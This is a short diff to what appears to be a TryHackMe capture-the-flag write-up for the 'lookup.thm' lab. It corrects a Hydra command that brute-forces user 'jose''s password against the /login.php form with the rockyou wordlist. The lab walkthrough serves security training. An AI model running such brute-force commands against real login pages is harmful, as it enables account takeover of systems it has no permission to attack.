@@ -219,7 +219,7 @@ jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 29
 ```bash
 # You can also use Hydra with this command, but it takes time and it depends on your hardware resources.
 
-$ hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/:username=^USER^&password=^PASS^:Wrong password. Please try again." -q  
+$ hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again." -q  
 ```
 
 ```bash
